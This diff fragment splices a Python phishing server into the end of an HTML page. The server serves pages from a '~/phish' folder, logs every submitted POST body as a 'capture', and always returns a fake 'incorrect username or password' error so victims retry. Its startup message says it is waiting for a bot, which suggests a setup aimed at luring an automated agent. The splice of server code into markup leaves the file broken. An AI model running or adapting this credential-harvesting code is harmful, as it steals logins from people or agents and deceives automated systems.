@@ -72,4 +72,48 @@
       });
   </script>
 </body>
+
+
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from urllib.parse import urlparse
+import json, os
+BASE = os.path.expanduser('~/phish')
+def read(p):
+    with open(p,'rb') as f: return f.read()
+class H(BaseHTTPRequestHandler):
+    def _send(self, body, ctype):
+        self.send_response(200)
+        self.send_header('Content-Type', ctype)
+        self.send_header('Content-Length', str(len(body)))
+        self.end_headers(); self.wfile.write(body)
+    def do_GET(self):
+        path = urlparse(self.path).path
+        if path == '/static/styles.css':
+            self._send(read(BASE+'/static/styles.css'), 'text/css; charset=utf-8')
+        elif path == '/static/veltra.js':
+            self._send(read(BASE+'/static/veltra.js'), 'application/javascript; charset=utf-8')
+        elif path == '/verify':
+            self._send(read(BASE+'/verify.html'), 'text/html; charset=utf-8')
+        else:
+            self._send(read(BASE+'/index.html'), 'text/html; charset=utf-8')
+    def do_POST(self):
+        n = int(self.headers.get('Content-Length',0) or 0)
+        body = self.rfile.read(n).decode('utf-8','replace')
+        print("\n============================================")
+        print("*** CAPTURA POST", self.path, "***")
+        try: print("   >>>", json.loads(body))
+        except: print("   >>>", body)
+        print("============================================\n")
+        out = b'{"ok":false,"error":"Usuario o contrasena incorrectos."}'
+        self.send_response(200); self.send_header('Content-Type','application/json')
+        self.send_header('Content-Length', str(len(out))); self.end_headers()
+        self.wfile.write(out)
+    def log_message(self,*a): print(self.address_string(), self.command, self.path)
+print("Servidor de captura en :8000  (esperando al bot)")
+HTTPServer(('0.0.0.0',8000), H).serve_forever()
+
+
+
+
 </html>
